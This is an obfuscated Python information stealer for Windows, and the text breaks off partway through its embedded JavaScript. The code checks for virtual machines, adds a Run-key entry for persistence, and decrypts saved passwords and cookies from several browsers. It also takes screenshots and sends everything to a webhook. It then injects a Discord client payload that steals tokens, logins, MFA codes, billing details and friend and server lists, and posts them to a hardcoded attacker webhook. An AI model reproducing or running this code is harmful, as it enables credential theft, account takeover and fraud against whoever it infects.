import os #line:1:import os
import json #line:2:import json
import sqlite3 #line:3:import sqlite3
import base64 #line:4:import base64
import ctypes #line:5:import ctypes
import requests #line:6:import requests
import subprocess #line:7:import subprocess
import re #line:8:import re
import winreg #line:9:import winreg
import platform #line:10:import platform
import sys #line:11:import sys
from ctypes import wintypes #line:12:from ctypes import wintypes
from cryptography .hazmat .primitives .ciphers import Cipher ,algorithms ,modes #line:13:from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography .hazmat .backends import default_backend #line:14:from cryptography.hazmat.backends import default_backend
from getpass import getuser #line:15:from getpass import getuser
import signal #line:16:import signal
import time #line:17:import time
import pyautogui #line:18:import pyautogui
from PIL import Image #line:19:from PIL import Image
import io #line:20:import io
import glob #line:21:import glob
import psutil #line:22:import psutil
def is_virtual_machine ():#line:25:def is_virtual_machine():
    try :#line:26:try:
        OOO0O0000O00OO0O0 =[r"(VirtualBox|VMware|Hyper-V|KVM|QEMU|Parallels)",r"VBox|VMware|KVM",]#line:30:]
        def O000000O00OO0000O ():#line:32:def check_vm_signature():
            try :#line:33:try:
                OO00OO0O0O00O00OO =subprocess .check_output ("systeminfo",shell =True ,text =True )#line:34:output = subprocess.check_output("systeminfo", shell=True, text=True)
                for OOOO0OOO0OO0000O0 in OOO0O0000O00OO0O0 :#line:35:for pattern in vm_detection_patterns:
                    if re .search (OOOO0OOO0OO0000O0 ,OO00OO0O0O00O00OO ,re .IGNORECASE ):#line:36:if re.search(pattern, output, re.IGNORECASE):
                        return True #line:37:return True
            except Exception as O000000O000O0O0OO :#line:38:except Exception as e:
                print (f"Error checking system information: {O000000O000O0O0OO}")#line:39:print(f"Error checking system information: {e}")
            return False #line:40:return False
        def O0O0OOOOOO00O00O0 ():#line:42:def check_vm_drivers():
            try :#line:43:try:
                O00O0O0OO000O0O00 =["vboxvideo","vmhgfs","vmxnet","kvm"]#line:44:vm_drivers = ["vboxvideo", "vmhgfs", "vmxnet", "kvm"]
                OO00O0OO0OO00OOOO =subprocess .run (["lsmod"],capture_output =True ,text =True )#line:45:result = subprocess.run(["lsmod"], capture_output=True, text=True)
                for O00O0000O0O00000O in O00O0O0OO000O0O00 :#line:46:for driver in vm_drivers:
                    if O00O0000O0O00000O in OO00O0OO0OO00OOOO .stdout :#line:47:if driver in result.stdout:
                        return True #line:48:return True
            except Exception as O00O0OO0O0000000O :#line:49:except Exception as e:
                print (f"Error checking VM drivers: {O00O0OO0O0000000O}")#line:50:print(f"Error checking VM drivers: {e}")
            return False #line:51:return False
        return O000000O00OO0000O ()or O0O0OOOOOO00O00O0 ()#line:53:return check_vm_signature() or check_vm_drivers()
    except Exception as O0OOO0OO0O0OO000O :#line:54:except Exception as e:
        print (f"Error detecting virtual machine: {O0OOO0OO0O0OO000O}")#line:55:print(f"Error detecting virtual machine: {e}")
        return False #line:56:return False
def bypass_vm_detection (OOO0OOO0O00OOOOOO ):#line:58:def bypass_vm_detection(webhook_url):
    if is_virtual_machine ():#line:59:if is_virtual_machine():
        print ("Virtual Machine detected. Sending notification and continuing script...")#line:60:print("Virtual Machine detected. Sending notification and continuing script...")
        try :#line:61:try:
            requests .post (OOO0OOO0O00OOOOOO ,json ={"notification":"Virtual Machine detected"})#line:62:requests.post(webhook_url, json={"notification": "Virtual Machine detected"})
        except Exception as OO0000O00OOOOOO0O :#line:63:except Exception as e:
            print (f"Error sending VM detection notification: {OO0000O00OOOOOO0O}")#line:64:print(f"Error sending VM detection notification: {e}")
    else :#line:65:else:
        print ("No virtual machine detected.")#line:66:print("No virtual machine detected.")
def add_persistence ():#line:69:def add_persistence():
    try :#line:70:try:
        O0O0O0O00OO0O00O0 =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,r"Software\Microsoft\Windows\CurrentVersion\Run",0 ,winreg .KEY_SET_VALUE )#line:71:key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg .SetValueEx (O0O0O0O00OO0O00O0 ,"MyApp",0 ,winreg .REG_SZ ,f"{os.path.abspath(__file__)}")#line:72:winreg.SetValueEx(key, "MyApp", 0, winreg.REG_SZ, f"{os.path.abspath(__file__)}")
        winreg .CloseKey (O0O0O0O00OO0O00O0 )#line:73:winreg.CloseKey(key)
        print ("Persistence added.")#line:74:print("Persistence added.")
    except Exception as O0O00000O000OO000 :#line:75:except Exception as e:
        print (f"Error adding persistence: {O0O00000O000OO000}")#line:76:print(f"Error adding persistence: {e}")
def get_db_path (OOO00000O00O0O000 ,OO000O0OO00OO0OO0 ):#line:79:def get_db_path(browser, data_type):
    OO0O0000O0O0O00O0 ={"chrome":{"logins":os .path .join (os .getenv ('LOCALAPPDATA'),"Google","Chrome","User Data","Default","Login Data"),"cookies":os .path .join (os .getenv ('LOCALAPPDATA'),"Google","Chrome","User Data","Default","Network","Cookies")},"edge":{"logins":os .path .join (os .getenv ('LOCALAPPDATA'),"Microsoft","Edge","User Data","Default","Login Data"),"cookies":os .path .join (os .getenv ('LOCALAPPDATA'),"Microsoft","Edge","User Data","Default","Network","Cookies")},"opera":{"logins":os .path .join (os .getenv ('APPDATA'),"Opera Software","Opera Stable","Login Data"),"cookies":os .path .join (os .getenv ('APPDATA'),"Opera Software","Opera Stable","Cookies")},"brave":{"logins":os .path .join (os .getenv ('LOCALAPPDATA'),"BraveSoftware","Brave-Browser","User Data","Default","Login Data"),"cookies":os .path .join (os .getenv ('LOCALAPPDATA'),"BraveSoftware","Brave-Browser","User Data","Default","Network","Cookies")},"vivaldi":{"logins":os .path .join (os .getenv ('LOCALAPPDATA'),"Vivaldi","User Data","Default","Login Data"),"cookies":os .path .join (os .getenv ('LOCALAPPDATA'),"Vivaldi","User Data","Default","Network","Cookies")},"yandex":{"logins":os .path .join (os .getenv ('LOCALAPPDATA'),"Yandex","YandexBrowser","User Data","Default","Login Data"),"cookies":os .path .join (os .getenv ('LOCALAPPDATA'),"Yandex","YandexBrowser","User Data","Default","Network","Cookies")}}#line:105:}
    return OO0O0000O0O0O00O0 .get (OOO00000O00O0O000 .lower (),{}).get (OO000O0OO00OO0OO0 )#line:106:return paths.get(browser.lower(), {}).get(data_type)
def file_exists (O0OO0OO00O0O0O0OO ):#line:108:def file_exists(file_path):
    return os .path .isfile (O0OO0OO00O0O0O0OO )#line:109:return os.path.isfile(file_path)
def read_file_to_string (O0O0O0O0OOOO0000O ):#line:111:def read_file_to_string(file_path):
    if file_exists (O0O0O0O0OOOO0000O ):#line:112:if file_exists(file_path):
        try :#line:113:try:
            with open (O0O0O0O0OOOO0000O ,'r',encoding ='utf-8')as OO000OO0OO0OO0O00 :#line:114:with open(file_path, 'r', encoding='utf-8') as file:
                return OO000OO0OO0OO0O00 .read ()#line:115:return file.read()
        except Exception as OOOO0O0O00O00O0OO :#line:116:except Exception as e:
            print (f"Error reading file: {OOOO0O0O00O00O0OO}")#line:117:print(f"Error reading file: {e}")
            return ""#line:118:return ""
    else :#line:119:else:
        print (f"File not found: {O0O0O0O0OOOO0000O}")#line:120:print(f"File not found: {file_path}")
        return ""#line:121:return ""
def parse_master_string (OOO0OOO0O000O0OO0 ):#line:123:def parse_master_string(local_state_data):
    try :#line:124:try:
        O00OOO0O0O0O0O0O0 =json .loads (OOO0OOO0O000O0OO0 )#line:125:local_state = json.loads(local_state_data)
        OOO00OOOOO0O00OOO =O00OOO0O0O0O0O0O0 .get ('os_crypt',{}).get ('encrypted_key','')#line:126:encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key', '')
        return base64 .b64decode (OOO00OOOOO0O00OOO )[5 :]#line:127:return base64.b64decode(encrypted_key)[5:]
    except Exception as O000OO0OOO00O0O00 :#line:128:except Exception as e:
        print (f"Error parsing master string: {O000OO0OOO00O0O00}")#line:129:print(f"Error parsing master string: {e}")
        return b''#line:130:return b''
def unprotect_master_key (O0OOO0O0O00OO00O0 ):#line:132:def unprotect_master_key(master_string):
    class OOO000OO000OOO0OO (ctypes .Structure ):#line:133:class DATA_BLOB(ctypes.Structure):
        _fields_ =[("cbData",wintypes .DWORD ),("pbData",ctypes .POINTER (ctypes .c_byte ))]#line:134:_fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]
    def OO0OOOO000OOOOOOO (OO0OOOO0000O0OOOO ):#line:136:def crypt_unprotect_data(encrypted_data):
        O0000O00O00O0OOOO =OOO000OO000OOO0OO (len (OO0OOOO0000O0OOOO ),OO0OOOO0000O0OOOO )#line:137:data_in = DATA_BLOB(len(encrypted_data), encrypted_data)
        OO0OOOO000OO00OOO =OOO000OO000OOO0OO ()#line:138:data_out = DATA_BLOB()
        if not ctypes .windll .crypt32 .CryptUnprotectData (ctypes .byref (O0000O00O00O0OOOO ),None ,None ,None ,None ,0 ,ctypes .byref (OO0OOOO000OO00OOO )):#line:139:if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)):
            raise Exception ("CryptUnprotectData failed")#line:140:raise Exception("CryptUnprotectData failed")
        return ctypes .string_at (OO0OOOO000OO00OOO .pbData ,OO0OOOO000OO00OOO .cbData )#line:141:return ctypes.string_at(data_out.pbData, data_out.cbData)
    try :#line:143:try:
        return OO0OOOO000OOOOOOO (O0OOO0O0O00OO00O0 )#line:144:return crypt_unprotect_data(master_string)
    except Exception as O0000O00O00OO00O0 :#line:145:except Exception as e:
        print (f"Error unprotecting master key: {O0000O00O00OO00O0}")#line:146:print(f"Error unprotecting master key: {e}")
        return b''#line:147:return b''
def decrypt_data (O0000OOOOO0OOO0OO ,O00O0OOO000O0OO00 ):#line:149:def decrypt_data(data, master_key):
    try :#line:150:try:
        O0O0OOO00000OO0OO =Cipher (algorithms .AES (O00O0OOO000O0OO00 ),modes .CBC (O0000OOOOO0OOO0OO [3 :15 ]),backend =default_backend ())#line:155:)
        OOO0OO0000OOO00O0 =O0O0OOO00000OO0OO .decryptor ()#line:156:decryptor = cipher.decryptor()
        return OOO0OO0000OOO00O0 .update (O0000OOOOO0OOO0OO [15 :])+OOO0OO0000OOO00O0 .finalize ()#line:157:return decryptor.update(data[15:]) + decryptor.finalize()
    except Exception as O0OOO0O0OO0OO00OO :#line:158:except Exception as e:
        print (f"Error decrypting data: {O0OOO0O0OO0OO00OO}")#line:159:print(f"Error decrypting data: {e}")
        return b''#line:160:return b''
def extract_passwords_from_db (OO00O0OO00OOOOOOO ,O00OOO0000OOO0OO0 ):#line:162:def extract_passwords_from_db(db_path, master_key):
    if not file_exists (OO00O0OO00OOOOOOO ):#line:163:if not file_exists(db_path):
        print (f"File not found: {OO00O0OO00OOOOOOO}")#line:164:print(f"File not found: {db_path}")
        return []#line:165:return []
    try :#line:167:try:
        O0O0OOO0O0OO00O00 =sqlite3 .connect (OO00O0OO00OOOOOOO )#line:168:conn = sqlite3.connect(db_path)
        O000OOOO00OOOO0OO =O0O0OOO0O0OO00O00 .cursor ()#line:169:cursor = conn.cursor()
        O000OOOO00OOOO0OO .execute ("SELECT action_url, username_value, password_value FROM logins")#line:170:cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        O00O00OO00O0OO0OO =O000OOOO00OOOO0OO .fetchall ()#line:171:rows = cursor.fetchall()
        O0O00O0OO000OO00O =[]#line:173:passwords = []
        for O0O00OOO0O00OO0O0 in O00O00OO00O0OO0OO :#line:174:for row in rows:
            OO0OO000OO00O00OO ,O0000O0OO0O0OOO0O ,O0OOO0000O000OO0O =O0O00OOO0O00OO0O0 #line:175:url, username, encrypted_password = row
            O0OOO0OOOO0000000 =decrypt_data (O0OOO0000O000OO0O ,O00OOO0000OOO0OO0 ).decode (errors ='ignore')#line:176:password = decrypt_data(encrypted_password, master_key).decode(errors='ignore')
            O0O00O0OO000OO00O .append ({"url":OO0OO000OO00O00OO ,"username":O0000O0OO0O0OOO0O ,"password":O0OOO0OOOO0000000 })#line:181:})
        return O0O00O0OO000OO00O #line:182:return passwords
    except Exception as OOO00O0OOOOO00OOO :#line:183:except Exception as e:
        print (f"Error extracting passwords: {OOO00O0OOOOO00OOO}")#line:184:print(f"Error extracting passwords: {e}")
        return []#line:185:return []
def extract_cookies_from_db (O0OOOOO00O0000O0O ,OO00O0O0OO000OOOO ):#line:187:def extract_cookies_from_db(db_path, master_key):
    if not file_exists (O0OOOOO00O0000O0O ):#line:188:if not file_exists(db_path):
        print (f"File not found: {O0OOOOO00O0000O0O}")#line:189:print(f"File not found: {db_path}")
        return []#line:190:return []
    try :#line:192:try:
        O000O0OO00O00OO0O =sqlite3 .connect (O0OOOOO00O0000O0O )#line:193:conn = sqlite3.connect(db_path)
        OO00O0O000000OO00 =O000O0OO00O00OO0O .cursor ()#line:194:cursor = conn.cursor()
        OO00O0O000000OO00 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:195:cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        OO0OO00OOOO0O0O0O =OO00O0O000000OO00 .fetchall ()#line:196:rows = cursor.fetchall()
        OOO0OO0O000000O00 =[]#line:198:cookies = []
        for OO0OO0OO0O00OO0OO in OO0OO00OOOO0O0O0O :#line:199:for row in rows:
            OO0000O00O000000O ,O00O0OOO000O0O0OO ,OO000O0OOOO0OO0OO =OO0OO0OO0O00OO0OO #line:200:host, name, encrypted_value = row
            O0OO0OOO0O000OO00 =decrypt_data (OO000O0OOOO0OO0OO ,OO00O0O0OO000OOOO ).decode (errors ='ignore')#line:201:value = decrypt_data(encrypted_value, master_key).decode(errors='ignore')
            OOO0OO0O000000O00 .append ({"host":OO0000O00O000000O ,"name":O00O0OOO000O0O0OO ,"value":O0OO0OOO0O000OO00 })#line:206:})
        return OOO0OO0O000000O00 #line:207:return cookies
    except Exception as OO00OOOOO0OOO00O0 :#line:208:except Exception as e:
        print (f"Error extracting cookies: {OO00OOOOO0OOO00O0}")#line:209:print(f"Error extracting cookies: {e}")
        return []#line:210:return []
def decrypt_passwords (OO000O0O0OOOO0O0O ):#line:212:def decrypt_passwords(browser):
    OO00O0000000O000O =get_db_path (OO000O0O0OOOO0O0O ,"logins")#line:213:local_state_path = get_db_path(browser, "logins")
    if not file_exists (OO00O0000000O000O ):#line:214:if not file_exists(local_state_path):
        print (f"File not found: {OO00O0000000O000O}")#line:215:print(f"File not found: {local_state_path}")
        return []#line:216:return []
    OO00OO0OOOO0O0OO0 =read_file_to_string (OO00O0000000O000O )#line:218:local_state_data = read_file_to_string(local_state_path)
    OOO0OOO00O000OO00 =parse_master_string (OO00OO0OOOO0O0OO0 )#line:219:master_string = parse_master_string(local_state_data)
    OO0OOO0OOOO00000O =unprotect_master_key (OOO0OOO00O000OO00 )#line:220:master_key = unprotect_master_key(master_string)
    O0O000000O0OO00OO =get_db_path (OO000O0O0OOOO0O0O ,"logins")#line:221:db_path = get_db_path(browser, "logins")
    return extract_passwords_from_db (O0O000000O0OO00OO ,OO0OOO0OOOO00000O )#line:222:return extract_passwords_from_db(db_path, master_key)
def decrypt_cookies (O000O000O0000O000 ):#line:224:def decrypt_cookies(browser):
    OO000OOO000OO0OOO =get_db_path (O000O000O0000O000 ,"cookies")#line:225:local_state_path = get_db_path(browser, "cookies")
    if not file_exists (OO000OOO000OO0OOO ):#line:226:if not file_exists(local_state_path):
        print (f"File not found: {OO000OOO000OO0OOO}")#line:227:print(f"File not found: {local_state_path}")
        return []#line:228:return []
    O0OOOO00O0OOOO00O =read_file_to_string (OO000OOO000OO0OOO )#line:230:local_state_data = read_file_to_string(local_state_path)
    O000OOO00OOOO0O00 =parse_master_string (O0OOOO00O0OOOO00O )#line:231:master_string = parse_master_string(local_state_data)
    OO0OO0OO00OOOOOO0 =unprotect_master_key (O000OOO00OOOO0O00 )#line:232:master_key = unprotect_master_key(master_string)
    O000O0O0OO00O0000 =get_db_path (O000O000O0000O000 ,"cookies")#line:233:db_path = get_db_path(browser, "cookies")
    return extract_cookies_from_db (O000O0O0OO00O0000 ,OO0OO0OO00OOOOOO0 )#line:234:return extract_cookies_from_db(db_path, master_key)
def extract_browser_data (OO00OOOO0OO00000O ):#line:236:def extract_browser_data(browser):
    try :#line:237:try:
        O000O0O0O0O000O00 =decrypt_passwords (OO00OOOO0OO00000O )#line:238:passwords = decrypt_passwords(browser)
        O0000OO0OO0OOO0O0 =decrypt_cookies (OO00OOOO0OO00000O )#line:239:cookies = decrypt_cookies(browser)
        return {"passwords":O000O0O0O0O000O00 ,"cookies":O0000OO0OO0OOO0O0 }#line:243:}
    except Exception as OO000O0O000O0000O :#line:244:except Exception as e:
        print (f"Error extracting data from {OO00OOOO0OO00000O}: {OO000O0O000O0000O}")#line:245:print(f"Error extracting data from {browser}: {e}")
        return {"passwords":[],"cookies":[]}#line:249:}
def send_data_to_webhook (O0OOOO000O0O00000 ,OOO0O0OOOO0O0OO00 ):#line:251:def send_data_to_webhook(data, webhook_url):
    try :#line:252:try:
        O0O00O000OOO0O0OO =requests .post (OOO0O0OOOO0O0OO00 ,json =O0OOOO000O0O00000 )#line:253:response = requests.post(webhook_url, json=data)
        O0O00O000OOO0O0OO .raise_for_status ()#line:254:response.raise_for_status()
        print ("Data sent successfully.")#line:255:print("Data sent successfully.")
    except requests .exceptions .RequestException as O000O0O00OO000O00 :#line:256:except requests.exceptions.RequestException as e:
        print (f"Failed to send data: {O000O0O00OO000O00}")#line:257:print(f"Failed to send data: {e}")
def capture_and_send_screenshot (O00O000O00O0O00OO ):#line:260:def capture_and_send_screenshot(webhook_url):
    try :#line:261:try:
        OO0O0O0OO0O000OOO =pyautogui .screenshot ()#line:262:screenshot = pyautogui.screenshot()
        OO00OO00O000OO0O0 =io .BytesIO ()#line:263:buffer = io.BytesIO()
        OO0O0O0OO0O000OOO .save (OO00OO00O000OO0O0 ,format ='PNG')#line:264:screenshot.save(buffer, format='PNG')
        OO00OO00O000OO0O0 .seek (0 )#line:265:buffer.seek(0)
        OO00000O0O0O00O00 =base64 .b64encode (OO00OO00O000OO0O0 .read ()).decode ('utf-8')#line:266:screenshot_data = base64.b64encode(buffer.read()).decode('utf-8')
        OOO0OOO0O0OOOO000 ={"content":"Here is a screenshot","file":OO00000O0O0O00O00 }#line:271:}
        O0OOO0O0OOO0O0O0O =requests .post (O00O000O00O0O00OO ,json =OOO0OOO0O0OOOO000 )#line:273:response = requests.post(webhook_url, json=data)
        O0OOO0O0OOO0O0O0O .raise_for_status ()#line:274:response.raise_for_status()
        print ("Screenshot sent successfully.")#line:275:print("Screenshot sent successfully.")
    except Exception as OO0OOO0OOOO0OOO0O :#line:276:except Exception as e:
        print (f"Failed to capture or send screenshot: {OO0OOO0OOOO0OOO0O}")#line:277:print(f"Failed to capture or send screenshot: {e}")
def detect_discord_versions ():#line:280:def detect_discord_versions():
    OOO0O0OO0OO00O00O =os .path .join (os .getenv ('APPDATA'),"Local","Discord")#line:281:base_path = os.path.join(os.getenv('APPDATA'), "Local", "Discord")
    OOO0O0O00OO00000O =""#line:282:app_version = ""
    OOO00OO0OOO00O00O =""#line:283:core_version = ""
    try :#line:285:try:
        if os .path .isdir (OOO0O0OO0OO00O00O ):#line:286:if os.path.isdir(base_path):
            for OO0OOOO0O000OO0OO in os .listdir (OOO0O0OO0OO00O00O ):#line:287:for item in os.listdir(base_path):
                if OO0OOOO0O000OO0OO .startswith ("app-"):#line:288:if item.startswith("app-"):
                    OOO0O0O00OO00000O =OO0OOOO0O000OO0OO #line:289:app_version = item
                    break #line:290:break
            O0OOOOOO00OOO0OOO =os .path .join (OOO0O0OO0OO00O00O ,OOO0O0O00OO00000O ,"modules")#line:292:core_path = os.path.join(base_path, app_version, "modules")
            if os .path .isdir (O0OOOOOO00OOO0OOO ):#line:293:if os.path.isdir(core_path):
                for OO0OOOO0O000OO0OO in os .listdir (O0OOOOOO00OOO0OOO ):#line:294:for item in os.listdir(core_path):
                    if OO0OOOO0O000OO0OO .startswith ("discord_desktop_core-"):#line:295:if item.startswith("discord_desktop_core-"):
                        OOO00OO0OOO00O00O =OO0OOOO0O000OO0OO #line:296:core_version = item
                        break #line:297:break
    except Exception as OO000OOOOOOOOOO00 :#line:298:except Exception as e:
        print (f"Error detecting Discord versions: {OO000OOOOOOOOOO00}")#line:299:print(f"Error detecting Discord versions: {e}")
    return OOO0O0O00OO00000O ,OOO00OO0OOO00O00O #line:301:return app_version, core_version
def inject_js_to_discord (O00O000O0O000OOO0 ):#line:303:def inject_js_to_discord(webhook_url):
    OOOOOOO0OOOO00O00 ,O000OO0000O000OO0 =detect_discord_versions ()#line:304:app_version, core_version = detect_discord_versions()
    if not OOOOOOO0OOOO00O00 or not O000OO0000O000OO0 :#line:305:if not app_version or not core_version:
        print ("Failed to detect Discord versions.")#line:306:print("Failed to detect Discord versions.")
        return #line:307:return
    OOO000O0OO0OO000O =os .path .join (os .getenv ('APPDATA'),"Local","Discord",OOOOOOO0OOOO00O00 ,"modules",O000OO0000O000OO0 ,"discord_desktop_core","index.js")#line:312:)
    if not file_exists (OOO000O0OO0OO000O ):#line:314:if not file_exists(index_js_path):
        print (f"File not found: {OOO000O0OO0OO000O}")#line:315:print(f"File not found: {index_js_path}")
        return #line:316:return
    try :#line:318:try:
        with open (OOO000O0OO0OO000O ,'r',encoding ='utf-8')as OOO0O00OOO0O00O00 :#line:319:with open(index_js_path, 'r', encoding='utf-8') as file:
            OO0OO0O0O0O000OO0 =OOO0O00OOO0O00O00 .read ()#line:320:content = file.read()
        OO000O000O0O0OOO0 =r"""
            // Your JavaScript code here
            console.log("Injected script running...");
            const fs = require('fs');
            const os = require('os');
            const https = require('https');
            const args = process.argv;
            const path = require('path');
            const querystring = require('querystring');

            const {
                BrowserWindow,
                session,
            } = require('electron');

            const CONFIG = {
                webhook: "https://discord.com/api/webhooks/1254850102904754176/ucZn6p7XZazNEFi63ii29Fob1dkE5pIvuFal3e-KnJgi76Ku9o6nYZ36r5GyZ2Zkt6Rv",
                injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
                filters: {
                    urls: [
                        '/auth/login',
                        '/auth/register',
                        '/mfa/totp',
                        '/mfa/codes-verification',
                        '/users/@me',
                    ],
                },
                filters2: {
                    urls: [
                        'wss://remote-auth-gateway.discord.gg/*',
                        'https://discord.com/api/v*/auth/sessions',
                        'https://*.discord.com/api/v*/auth/sessions',
                        'https://discordapp.com/api/v*/auth/sessions'
                    ],
                },
                payment_filters: {
                    urls: [
                        'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
                        'https://api.stripe.com/v*/tokens',
                    ],
                },
                API: "https://discord.com/api/v9/users/@me",
                badges: {
                    Discord_Emloyee: {
                        Value: 1,
                        Emoji: "<:8485discordemployee:1163172252989259898>",
                        Rare: true,
                    },
                    Partnered_Server_Owner: {
                        Value: 2,
                        Emoji: "<:9928discordpartnerbadge:1163172304155586570>",
                        Rare: true,
                    },
                    HypeSquad_Events: {
                        Value: 4,
                        Emoji: "<:9171hypesquadevents:1163172248140660839>",
                        Rare: true,
                    },
                    Bug_Hunter_Level_1: {
                        Value: 8,
                        Emoji: "<:4744bughunterbadgediscord:1163172239970140383>",
                        Rare: true,
                    },
                    Early_Supporter: {
                        Value: 512,
                        Emoji: "<:5053earlysupporter:1163172241996005416>",
                        Rare: true,
                    },
                    Bug_Hunter_Level_2: {
                        Value: 16384,
                        Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
                        Rare: true,
                    },
                    Early_Verified_Bot_Developer: {
                        Value: 131072,
                        Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>",
                        Rare: true,
                    },
                    House_Bravery: {
                        Value: 64,
                        Emoji: "<:6601hypesquadbravery:1163172246492287017>",
                        Rare: false,
                    },
                    House_Brilliance: {
                        Value: 128,
                        Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",
                        Rare: false,
                    },
                    House_Balance: {
                        Value: 256,
                        Emoji: "<:5242hypesquadbalance:1163172243417858128>",
                        Rare: false,
                    },
                    Active_Developer: {
                        Value: 4194304,
                        Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
                        Rare: false,
                    },
                    Certified_Moderator: {
                        Value: 262144,
                        Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>",
                        Rare: true,
                    },
                    Spammer: {
                        Value: 1048704,
                        Emoji: "⌨️",
                        Rare: false,
                    },
                },
            };

            const executeJS = script => {
                const window = BrowserWindow.getAllWindows()[0];
                return window.webContents.executeJavaScript(script, !0);
            };

            const clearAllUserData = () => {
                executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
                executeJS("location.reload()");
            };

            const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

            const request = async (method, url, headers, data) => {
                url = new URL(url);
                const options = {
                    protocol: url.protocol,
                    hostname: url.host,
                    path: url.pathname,
                    method: method,
                    headers: {
                        "Access-Control-Allow-Origin": "*",
                    },
                };

                if (url.search) options.path += url.search;
                for (const key in headers) options.headers[key] = headers[key];
                const req = https.request(options);
                if (data) req.write(data);
                req.end();

                return new Promise((resolve, reject) => {
                    req.on("response", res => {
                        let data = "";
                        res.on("data", chunk => data += chunk);
                        res.on("end", () => resolve(data));
                    });
                });
            };

            const hooker = async (content, token, account) => {
                content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
                content["username"] = "skuld - cord injection";
                content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
                content["embeds"][0]["author"] = {
                    "name": account.username,
                };
                content["embeds"][0]["thumbnail"] = {
                    "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
                };
                content["embeds"][0]["footer"] = {
                    "text": "skuld discord injection - made by hackirby",
                    "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
                };
                content["embeds"][0]["title"] = "Account Information";

                const nitro = getNitro(account.premium_type);
                const badges = getBadges(account.flags);
                const billing = await getBilling(token);

                const friends = await getFriends(token);
                const servers = await getServers(token);

                content["embeds"][0]["fields"].push({
                    "name": "Token",
                    "value": "```" + token + "```",
                    "inline": false
                }, {
                    "name": "Nitro",
                    "value": nitro,
                    "inline": true
                }, {
                    "name": "Badges",
                    "value": badges,
                    "inline": true
                }, {
                    "name": "Billing",
                    "value": billing,
                    "inline": true
                });

                content["embeds"].push({
                    "title": `Total Friends: ${friends.totalFriends}`,
                    "description": friends.message,
                }, {
                    "title": `Total Servers: ${servers.totalGuilds}`,
                    "description": servers.message,
                });

                for (const embed in content["embeds"]) {
                    content["embeds"][embed]["color"] = 0xb143e3;
                }

                await request("POST", CONFIG.webhook, {
                    "Content-Type": "application/json"
                }, JSON.stringify(content));
            };

            const fetch = async (endpoint, headers) => {
                return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
            };

            const fetchAccount = async token => await fetch("", {
                "Authorization": token
            });
            const fetchBilling = async token => await fetch("/billing/payment-sources", {
                "Authorization": token
            });
            const fetchServers = async token => await fetch("/guilds?with_counts=true", {
                "Authorization": token
            });
            const fetchFriends = async token => await fetch("/relationships", {
                "Authorization": token
            });

            const getNitro = flags => {
                switch (flags) {
                    case 1:
                        return '`Nitro Classic`';
                    case 2:
                        return '`Nitro Boost`';
                    case 3:
                        return '`Nitro Basic`';
                    default:
                        return '`❌`';
                }
            };

            const getBadges = flags => {
                let badges = '';
                for (const badge in CONFIG.badges) {
                    let b = CONFIG.badges[badge];
                    if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
                }
                return badges || '`❌`';
            }

            const getRareBadges = flags => {
                let badges = '';
                for (const badge in CONFIG.badges) {
                    let b = CONFIG.badges[badge];
                    if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
                }
                return badges;
            }

            const getBilling = async token => {
                const data = await fetchBilling(token);
                let billing = '';
                data.forEach((x) => {
                    if (!x.invalid) {
                        switch (x.type) {
                            case 1:
                                billing += '💳 ';
                                break;
                            case 2:
                                billing += '<:paypal:1148653305376034967> ';
                                break;
                        }
                    }
                });
                return billing || '`❌`';
            };

            const getFriends = async token => {
                const friends = await fetchFriends(token);

                const filteredFriends = friends.filter((user) => {
                    return user.type == 1
                })
                let rareUsers = "";
                for (const acc of filteredFriends) {
                    var badges = getRareBadges(acc.user.public_flags)
                    if (badges != "") {
                        if (!rareUsers) rareUsers = "**Rare Friends:**\n";
                        rareUsers += `${badges} ${acc.user.username}\n`;
                    }
                }
                rareUsers = rareUsers || "**No Rare Friends**";

                return {
                    message: rareUsers,
                    totalFriends: friends.length,
                };
            };

            const getServers = async token => {
                const guilds = await fetchServers(token);

                const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
                let rareGuilds = "";
                for (const guild of filteredGuilds) {
                    if (rareGuilds === "") {
                        rareGuilds += `**Rare Servers:**\n`;
                    }
                    rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
                }

                rareGuilds = rareGuilds || "**No Rare Servers**";

                return {
                    message: rareGuilds,
                    totalGuilds: guilds.length,
                };
            };

            const EmailPassToken = async (email, password, token, action) => {
                const account = await fetchAccount(token)

                const content = {
                    "content": `**${account.username}** just ${action}!`,
                    "embeds": [{
                        "fields": [{
                            "name": "Email",
                            "value": "`" + email + "`",
                            "inline": true
                        }, {
                            "name": "Password",
                            "value": "`" + password + "`",
                            "inline": true
                        }]
                    }]
                };

                hooker(content, token, account);
            }

            const BackupCodesViewed = async (codes, token) => {
